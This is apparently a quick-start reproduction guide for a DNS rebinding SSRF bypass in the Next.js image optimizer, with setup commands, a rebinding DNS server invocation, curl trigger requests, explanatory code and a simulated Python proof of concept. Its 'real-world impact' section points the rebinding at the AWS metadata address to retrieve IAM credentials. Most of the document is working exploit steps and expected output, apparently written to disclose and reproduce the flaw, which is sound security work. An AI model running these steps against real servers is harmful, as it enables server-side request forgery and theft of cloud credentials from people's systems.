# Quick Start - 5 Minute Reproduction

## Fastest Way to Reproduce

### Option 1: Using /etc/hosts + Manual Testing (Conceptual Demo)

This won't show true DNS rebinding but demonstrates the TOCTOU gap:

```bash
# 1. Create test Next.js app
npx create-next-app@latest test-app --typescript --app
cd test-app

# 2. Edit next.config.js
cat > next.config.js << 'EOF'
module.exports = {
  images: {
    remotePatterns: [{ protocol: 'http', hostname: '**' }],
    dangerouslyAllowLocalIP: false, // VULNERABLE
  },
}
EOF

# 3. Start Next.js
npm run dev &

# 4. Test SSRF protection works
curl "http://localhost:3000/_next/image?url=http://127.0.0.1:3000/&w=640&q=75"
# Expected: 400 - "url" parameter is not allowed ✅

# 5. Observe the TOCTOU vulnerability in code
# Open: node_modules/next/dist/server/image-optimizer.js
# Find fetchExternalImage function around line 711-770
# See: DNS lookup at line 720, fetch() at line 738 (separate resolutions!)
```

### Option 2: Full DNS Rebinding POC (Complete Demo)

```bash
# 1. Install dependencies
pip3 install dnslib

# 2. Download POC files
git clone <this-repo>
cd poc-dns-rebinding

# 3. Start DNS server (Terminal 1)
sudo python3 dns-rebinding-server.py 8.8.8.8 127.0.0.1

# 4. Configure system DNS (Terminal 2)
# macOS:
sudo mkdir -p /etc/resolver
echo "nameserver 127.0.0.1" | sudo tee /etc/resolver/ssrf.test

# Linux:
# Add to /etc/resolv.conf: nameserver 127.0.0.1

# 5. Test DNS works
dig @127.0.0.1 ssrf.test +short
# First call: 8.8.8.8
dig @127.0.0.1 ssrf.test +short
# Second call: 127.0.0.1

# 6. Setup Next.js app (Terminal 3)
npx create-next-app@latest test-app --typescript --app
cd test-app
# Use next.config.js from Option 1
npm run dev

# 7. Trigger exploitation
curl "http://localhost:3000/_next/image?url=http://ssrf.test:3000/&w=640&q=75" -v

# 8. Check DNS server logs (Terminal 1)
# You should see:
# [VALIDATION] Request #1 → Returning PUBLIC IP: 8.8.8.8
# [EXPLOITATION] Request #2 → Returning PRIVATE IP: 127.0.0.1 ⚠️
```

## What to Look For

### ✅ Success Indicators:

1. **DNS Server Logs**:
```
[12:34:56.789] [VALIDATION] Request #1 from 127.0.0.1 → Returning PUBLIC IP: 8.8.8.8
[12:34:56.845] [EXPLOITATION] Request #2 from 127.0.0.1 → Returning PRIVATE IP: 127.0.0.1 ⚠️
```

2. **curl Response**: HTTP 200 (not 400 error)

3. **Code Path**: Request went through despite private IP

### ❌ Common Issues:

- **DNS not resolving**: Check `resolv.conf` or `/etc/resolver/`
- **Permission denied**: Use `sudo` for DNS server (port 53)
- **Same IP twice**: Clear DNS cache between requests
- **400 error**: Check `remotePatterns` in `next.config.js`

## Why This Works

```typescript
// packages/next/src/server/image-optimizer.ts

export async function fetchExternalImage(href, dangerouslyAllowLocalIP) {
  // STEP 1: DNS Lookup for validation (line 720-726)
  const records = await lookup(hostname)  // → 8.8.8.8 (public)
  const privateIps = records.filter(ip => isPrivateIp(ip))
  if (privateIps.length > 0) {
    throw new ImageError(400, 'not allowed')  // ✅ PASSES
  }

  // STEP 2: fetch() does its OWN DNS lookup (line 738)
  const res = await fetch(href)  // → Resolves to 127.0.0.1 (private)
                                  // ⚠️ BYPASSES CHECK!
}
```

**Gap**: 10-50ms between lookups = DNS rebinding window

## Simplified Visual Timeline

```
Time  | Action                           | Result
------|----------------------------------|------------------
0ms   | Request received                 |
10ms  | DNS lookup #1: ssrf.test         | → 8.8.8.8
15ms  | isPrivateIp(8.8.8.8)            | → false ✅
20ms  | [ATTACKER CHANGES DNS]           |
30ms  | fetch() DNS lookup #2: ssrf.test | → 127.0.0.1
35ms  | Connect to 127.0.0.1             | ⚠️ EXPLOIT!
```

## Real-World Impact Example

### AWS Metadata Attack:

```bash
# On AWS EC2 instance:
sudo python3 dns-rebinding-server.py 8.8.8.8 169.254.169.254

curl "http://localhost:3000/_next/image?url=http://ssrf.test/latest/meta-data/iam/security-credentials/role-name&w=640&q=75" \
  -o creds.jpg

strings creds.jpg | grep AccessKeyId
# Output: Actual AWS credentials! 🎯
```

## One-Liner Tests

```bash
# Test 1: Verify SSRF protection exists
curl -I "http://localhost:3000/_next/image?url=http://127.0.0.1:3000/&w=640&q=75"
# Expected: 400 Bad Request

# Test 2: Bypass with DNS rebinding
curl -I "http://localhost:3000/_next/image?url=http://ssrf.test:3000/&w=640&q=75"
# Expected: 200 OK (if DNS rebinding works)
```

## Minimal Reproducible Code

```python
# minimal-poc.py - Demonstrates the vulnerability concept
import dns.resolver
import requests
import time

# Attacker-controlled DNS that changes over time
def resolve_dns(domain, attempt):
    if attempt == 1:
        return "8.8.8.8"  # Public IP (passes check)
    else:
        return "127.0.0.1"  # Private IP (exploit)

# Simulating Next.js fetchExternalImage
domain = "ssrf.test"

# STEP 1: DNS lookup for SSRF check
ip1 = resolve_dns(domain, 1)
print(f"[CHECK] Resolved {domain} to {ip1}")

is_private = ip1.startswith("127.") or ip1.startswith("192.168.")
if is_private:
    print("[BLOCKED] Private IP detected!")
    exit()
else:
    print("[PASSED] Public IP, proceeding...")

# STEP 2: fetch() does another DNS lookup (vulnerability)
time.sleep(0.01)  # Tiny gap for DNS change
ip2 = resolve_dns(domain, 2)
print(f"[FETCH] Resolved {domain} to {ip2}")

# Now connecting to private IP despite passing check!
print(f"[EXPLOIT] Connecting to {ip2} (bypassed SSRF protection!)")
```

Run it:
```bash
python3 minimal-poc.py
```

Output:
```
[CHECK] Resolved ssrf.test to 8.8.8.8
[PASSED] Public IP, proceeding...
[FETCH] Resolved ssrf.test to 127.0.0.1
[EXPLOIT] Connecting to 127.0.0.1 (bypassed SSRF protection!)
```

This demonstrates the TOCTOU vulnerability without needing actual DNS infrastructure.
